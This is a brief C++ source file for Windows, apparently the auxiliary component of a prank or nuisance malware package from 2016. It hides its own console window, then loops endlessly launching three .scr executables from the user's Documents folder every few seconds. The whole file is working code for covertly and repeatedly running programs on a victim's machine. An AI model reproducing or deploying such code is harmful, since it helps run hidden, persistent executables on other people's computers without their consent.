/* hu3-aux - 2016 - cr4sh3r */

#include <iostream> 
#include <Windows.h>
#include <string>

void payload();

int main() {
	FreeConsole();
	payload();
}

void payload() {
	while (true) {
		char* names[] = {"bambams.scr /s","jajas.scr /s","xavs.scr /s"};
		for (int za = 0; za <= 2; za++) {
			std::string scom0("start C:\\Users\\%username%\\Documents\\");
			scom0 += names[za];
			system(scom0.c_str());
			Sleep(5000);
			if (za == 2){
				za -= 2;
				Sleep(1000 * 45);
			}
		}
	}
}
